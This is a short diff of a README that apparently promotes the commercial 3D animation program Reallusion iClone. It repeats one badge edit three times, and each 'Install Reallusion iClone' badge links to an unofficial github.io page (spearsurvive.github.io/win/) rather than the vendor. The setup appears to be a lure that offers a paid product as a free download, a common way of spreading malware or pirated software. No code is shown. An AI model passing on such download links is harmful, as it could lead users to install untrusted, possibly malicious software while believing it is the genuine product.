@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion%20iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion+iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Reallusion iClone is a real-time 3D animation software for creating animated fil
 
 <div align="center">
 
-[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion%20iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion+iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Reallusion iClone is a real-time 3D animation software for creating animated fil
 
 <div align="center">
 
-[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion%20iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion iClone](https://img.shields.io/badge/⬇_Install_Reallusion+iClone-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
